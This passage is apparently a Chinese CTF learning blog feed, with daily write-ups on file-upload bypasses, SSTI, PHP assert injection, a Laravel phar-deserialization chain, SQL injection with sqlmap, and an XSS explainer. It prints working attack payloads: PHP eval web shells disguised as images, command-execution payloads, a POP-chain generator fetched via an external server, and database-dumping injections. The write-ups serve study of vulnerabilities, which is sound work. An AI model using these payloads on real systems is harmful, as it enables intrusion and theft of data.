class="variable">$allowexts</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$allowexts</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;give me a image file not a php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;bugku&quot;</span>.date(<span class="string">&#x27;dHis&#x27;</span>).<span class="string">&quot;_&quot;</span>.rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">	    	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &lt;br /&gt;&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span>&#123;</span><br><span class="line">	    	<span class="keyword">if</span> (!file_exists(<span class="string">&#x27;./upload/&#x27;</span>))&#123;</span><br><span class="line">	    		mkdir (<span class="string">&quot;./upload/&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;chmod 777 /var/www/html/upload&quot;</span>);</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Upload Success&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">	      	<span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> .<span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="variable">$filepath</span> . <span class="string">&quot;&#x27; target=&#x27;_blank&#x27;&gt;&quot;</span> . <span class="variable">$filepath</span> . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;You was catched! :) &lt;br /&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.jianshu.com/p/e810d1799384">Multipart/form-data</a></p>
<p>请求报文如下</p>
<pre><code>POST /index.php HTTP/1.1
Host: 114.67.246.176:14763
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: Multipart/form-data; boundary=---------------------------32353450643031824090431304445
Content-Length: 381
Origin: http://114.67.246.176:11309
Connection: close
Referer: http://114.67.246.176:11309/index.php
Cookie: Hm_lvt_c1b044f909411ac4213045f0478e96fc=1629209960; _ga=GA1.1.2129155464.1629209961; _gid=GA1.1.1987461044.1629209961
Upgrade-Insecure-Requests: 1

-----------------------------32353450643031824090431304445
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php4&quot;
Content-Type: image/png

&lt;script language=php&gt;eval($_POST[&#39;cmd&#39;])&lt;/script&gt;
-----------------------------32353450643031824090431304445
Content-Disposition: form-data; name=&quot;submit&quot;

Submit
-----------------------------32353450643031824090431304445--
</code></pre>
<p>可以看到用的Multipart/form-data请求方法，后面boundary是分界线，内容中Content-Type，将原来的application改为image/png，filename改为php4,因为没被过滤，上传成功之后就可以用蚁剑连了，然后翻目录，看index.php代码，这题挺恶心的</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>文件上传</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>20210817</title>
    <url>/posts/7be9f79f/</url>
    <content><![CDATA[<blockquote>
<p>都与flask有关，找机会学一下这个框架</p>
</blockquote>
<h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>F12审查，上传jpg后会以python文件形式将其执行，写一个py然后改后缀即可或者bp抓包改上传形式</p>
<p>写入以下内容</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;ls /&quot;</span>) <span class="comment">#扫描根目录</span></span><br></pre></td></tr></table></figure>

<p>看回传，有个flag，直接cat就行</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>笑死了</p>
<p><a href="https://blog.csdn.net/weixin_45950544/article/details/103847262">https://blog.csdn.net/weixin_45950544/article/details/103847262</a></p>
<p>传入参数</p>
<pre><code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;
</code></pre>
<h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p>挺有趣的一个题，用tplmap模板注入就行，还挺好用的</p>
<pre><code>python2 tplmap.py -u url --engine=Jinja --os-shell
</code></pre>
<h2 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h2><p>感觉一般般，没给代码</p>
<p>用的哈希0e的方法</p>
<p>MD5碰撞</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p>
<p>所以就令a=一个哈希后以”0E“开头的字符串即可</p>
<p>随便试几个</p>
<table>
<thead>
<tr>
<th align="center">字符串</th>
<th align="center">哈希值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">QNKCDZO</td>
<td align="center">0e830400451993494058024219903391</td>
</tr>
<tr>
<td align="center">s878926199a</td>
<td align="center">0e545993274517709034328855841020</td>
</tr>
<tr>
<td align="center">s155964671a</td>
<td align="center">0e342768416822451524974117254469</td>
</tr>
<tr>
<td align="center">s214587387a</td>
<td align="center">0e848240448830537924465865611904</td>
</tr>
<tr>
<td align="center">s214587387a</td>
<td align="center">0e848240448830537924465865611904</td>
</tr>
<tr>
<td align="center">s878926199a</td>
<td align="center">0e545993274517709034328855841020</td>
</tr>
<tr>
<td align="center">s1091221200a</td>
<td align="center">0e940624217856561557816327384675</td>
</tr>
<tr>
<td align="center">s1885207154a</td>
<td align="center">0e509367213418206700842008763514</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>20210819</title>
    <url>/posts/9c51da98/</url>
    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
</code></pre>
<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
<pre><code> echo urlencode(serialize($KEY));
</code></pre>
<p>先urlencode一下不容易出错</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>对web漏洞常见缩写的解释</title>
    <url>/posts/e15b0610/</url>
    <content><![CDATA[<h1 id="对web漏洞常见缩写的解释"><a href="#对web漏洞常见缩写的解释" class="headerlink" title="对web漏洞常见缩写的解释"></a>对web漏洞常见缩写的解释</h1><h2 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h2><p>全称<strong>Cross Site Scripting</strong>，攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
<p><a href="https://www.cnblogs.com/csnd/p/11807592.html">https://www.cnblogs.com/csnd/p/11807592.html</a></p>
<h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p>
<p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。</p>
<h3 id="持久型-XSS"><a href="#持久型-XSS" class="headerlink" title="持久型 XSS"></a>持久型 XSS</h3><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p>
<p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> );</span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> );</span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">    <span class="comment">//mysql_close(); &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。</p>
<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p>
<p>HTML 代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM-XSS test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> a=<span class="built_in">document</span>.URL;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.write(a.substring(a.indexOf(<span class="string">&quot;a=&quot;</span>)+<span class="number">2</span>,a.length));</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将代码保存在 domXSS.html 中，浏览器访问：</p>
<pre><code>http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
</code></pre>
<p>即可触发 XSS 漏洞。</p>
]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>202108202</title>
    <url>/posts/3719f1b1/</url>
    <content><![CDATA[<ol>
<li>客户端配置了php环境，打算debug，在学习larvel的debug，但是不会弄，还在学</li>
<li>安装了unbuntu，配置了ssh，用vscode远程连接虚拟机调试</li>
<li>bugku的web基本做完了，buu上的是真难</li>
<li>在系统的学习一下web</li>
<li>搭建了私有云，还行挺流畅</li>
<li>数学建模停摆了一段时间</li>
<li>对服务器了解越来越丰富了，单纯宝塔已经无法满足了</li>
<li>实习报告还没开始写</li>
</ol>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>202108203</title>
    <url>/posts/401ec127/</url>
    <content><![CDATA[<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and 0 union select 1,2,3 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,TABLE_SCHEMA,TABLE_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.COLUMNS 表 表名</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and 0 union select 1,column_name,data_type from information_schema.columns where table_name=&#x27;</span>secret_table<span class="string">&#x27;# 列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,fl4g <span class="keyword">from</span> secret_table #</span><br></pre></td></tr></table></figure>

<p>查找显示位</p>
<pre><code>1&#39; order by 3 #
1&#39; union select 1,2,3#
</code></pre>
<h1 id="sqlmap用法"><a href="#sqlmap用法" class="headerlink" title="sqlmap用法"></a>sqlmap用法</h1><h2 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h2><p>用bp抓包后，copy files到sqlmap目录</p>
<p>使用方法</p>
<pre><code>python3 sqlmap.py -r 1.txt
</code></pre>
<p>查看所有数据库</p>
<pre><code>python3 sqlmap.py -r 1.txt --dbs
</code></pre>
<p>查看库下表</p>
<pre><code>python3 sqlmap.py -r 1.txt -D news --tables
</code></pre>
<p>查看表下列</p>
<pre><code>python3 sqlmap.py -r 1.txt -D news -T secret_table --columns
</code></pre>
<p>查看列下内容</p>
<pre><code>python3 sqlmap.py -r 1.txt -D news -T secret_table -C fl4g --dump
</code></pre>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>20210827</title>
    <url>/posts/50c4a45c/</url>
    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>20210901</title>
    <url>/posts/8a5309dc/</url>
    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
<p>git泄露，代码审计，assert命令执行</p>
</blockquote>
<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
</code></pre>
<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>20210830</title>
    <url>/posts/d7bb00be/</url>
    <content><![CDATA[<h1 id="HMBCTF-2021-EzLight"><a href="#HMBCTF-2021-EzLight" class="headerlink" title="[HMBCTF 2021]EzLight"></a>[HMBCTF 2021]EzLight</h1><p>先下载源码，本地搭建一下环境，我这出了点问题了，一直显示服务器内部错误。</p>
<p>百度得知lightcms有rce漏洞，在source中查找发现可以</p>
<p>参考<a href="https://igml.top/2021/05/10/lightcms-RCE/">https://igml.top/2021/05/10/lightcms-RCE/</a></p>
<p>在本地中跟了一下</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830143736.png"></p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830143705.png"></p>
<p>跟进fetchImageFile</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830144048.png"></p>
<p>跟进make</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830144514.png"></p>
<p>找到file_get_contents()</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830144657.png"></p>
<p>利用phar反序列化，这个也是才学的，还挺好玩，看了一下larvel的pop链，发现可以利用，参考<a href="https://www.anquanke.com/post/id/231079">https://www.anquanke.com/post/id/231079</a></p>
<p>生成phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">      <span class="keyword">protected</span> <span class="variable">$connection</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $command = new Illuminate\Broadcasting\BroadcastEvent(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$dispater</span> = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$PendingBroadcast</span> = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="variable">$dispater</span>,<span class="variable">$command</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$PendingBroadcast</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>中途靶机过期，懵逼</p>
<p>将 phar 上传得到路径 </p>
<pre><code>upload/image/202108/zz8bZRfp7OV5lfPz3EJs1LyXZpWaXWfFsfgGSAiQ.gif 
</code></pre>
<p>在自己的服务器上上传一个txt,内容</p>
<pre><code>phar://./upload/image/202108/zz8bZRfp7OV5lfPz3EJs1LyXZpWaXWfFsfgGSAiQ.gif 
</code></pre>
<p>利用刚才的触发点，直接post传参</p>
<pre><code>file=https://haorical.xyz/heihei.txt
</code></pre>
<p>得到flag</p>
]]></content>
      <categories>
        <category>ctf每日一题</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>20210904</title>
    <url>/posts/fa39fd53/</url>
    <content><![CDATA[<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><blockquote>
<p>后端语句猜测 ||绕过</p>
</blockquote>
<p>sql语句</p>
<pre><code>sql=&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;
</code></pre>
<p>先堆叠注入，获得数据库名，表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> databases;</span><br><span class="line"><span class="number">1</span>;<span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure>

<p>直接表获取内容失败</p>
<pre><code>1;desc `Flag`;
</code></pre>
<p>payload1:</p>
<pre><code>*,1
</code></pre>
<p>payroad2:</p>
<pre><code>1;set sql_mode=pipes_as_concat;select 1
</code></pre>
<p>其中set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串</p>
